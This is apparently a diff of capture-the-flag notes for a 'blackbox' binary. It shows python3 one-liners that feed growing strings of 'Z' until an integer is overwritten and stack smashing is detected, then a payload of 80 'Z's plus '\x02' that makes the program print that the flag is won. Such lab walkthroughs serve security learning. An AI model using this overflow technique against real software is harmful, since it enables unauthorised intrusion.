@@ -20,10 +20,22 @@ What is 1 + 1 = No dummy... 1 + 1 != 1515870810...
 
 [5]+  Stopped                 python3 -c 'print("Z"*100)' | ./blackbox
 
--
-
--python3 -c 'print("Z" * 80)' | ./blackbox
+-blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print("Z"*70)' | ./blackbox
 What is 1 + 1 = No dummy... 1 + 1 != 0...
+blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print("Z"*79)' | ./blackbox
+What is 1 + 1 = No dummy... 1 + 1 != 0...
+blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print("Z"*80)' | ./blackbox
+What is 1 + 1 = No dummy... 1 + 1 != 0...
+blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print("Z"*81)' | ./blackbox
+What is 1 + 1 = No dummy... 1 + 1 != 90...
+blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print("Z"*88)' | ./blackbox
+What is 1 + 1 = No dummy... 1 + 1 != 1515870810...
+blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print("Z"*89)' | ./blackbox
+What is 1 + 1 = No dummy... 1 + 1 != 1515870810...
+*** stack smashing detected ***: <unknown> terminated
+
+[6]+  Stopped                 python3 -c 'print("Z"*89)' | ./blackbox
+
 
 -python3 -c 'print("Z" * 80 + "\x02")' | ./blackbox
 What is 1 + 1 = CORRECT! You get flag: 
